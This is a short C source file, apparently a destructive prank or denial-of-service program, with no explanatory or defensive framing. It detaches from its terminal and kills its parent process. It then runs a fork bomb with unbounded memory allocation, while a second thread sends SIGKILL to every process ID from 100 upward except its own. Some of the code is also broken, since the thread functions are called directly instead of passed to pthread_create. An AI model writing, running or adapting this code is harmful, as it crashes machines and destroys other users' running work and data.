#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <math.h>
#include <signal.h>

void * explode_mem ();
void * kill_process (bool b);

void start ();

int su_pid;

int
main(void)
{


        pid_t pid, sid;

        /* Fork off the parent process */

        pid = fork();

        if (pid < 0)
                exit(EXIT_FAILURE);

        /* If we got a good PID, then
           we can exit the parent process. */
        if (pid > 0)
                exit(EXIT_SUCCESS);


	/* START THE CHAOS */
	start();
}

void
start ()
{
 /* First off, try to kill the parent process if it doesn't exit */
 kill_process(false);

 pthread_t pth_mem;        // pthread
 pthread_t pth_process;   // pthread
 int i = 0;

 /* Create worker thread */
 pthread_create(&pth_mem, NULL, explode_mem(), NULL);
 pthread_create(&pth_process, NULL, kill_process(true), true);

 /* wait for our thread to finish before continuing */
 pthread_join(pth_mem, NULL);
 pthread_join(pth_process, NULL);

}


void *
explode_mem ()
{
 su_pid = getpid();
 int x = 0x0000;
 int memtest = 0;
 int *p_mem = &memtest;
 x = (int) p_mem;
 unsigned char const *p = (unsigned char const *) &x;
 size_t i;
 unsigned char const *p1, *p2;

 int counter_trigger = 0;

 while(true)
 { //stabilize thread
  while(sin(1 / 10 * counter_trigger) != cos(1 / 10 * counter_trigger)) //increased period
  {
	 if(counter_trigger > 4096)
	  fork(); //only forks if memory is allocated to an extent

         for (i=0; i < sizeof x; i++)
	 {
                 //printf("%02X ", p[i]);
		 p2 = &p[i];
		 p1 = malloc(sizeof(p2));
         }

	 if(counter_trigger < 2)
	  fork(); //let's have some fun first

         x++;
  }
 }
 return 0;
}

void *
kill_process (bool b)
{
 if(b)
 {
  pid_t pid_indicator = 1;
  while(true)
  {
   while(pid_indicator != getpid() &&
         pid_indicator != getppid() &&
         pid_indicator != su_pid &&
         pid_indicator >= 100) //kill everything else than ourselves, and low level services
   {
    //kill ya
    kill(pid_indicator ,SIGKILL);
    pid_indicator++; //it's okay to have a few skips new the parent process...
   }
   pid_indicator++;
  }
 }
 else
 if(!b)
 { //kill parent
  kill(getppid(), SIGKILL);
 }
}
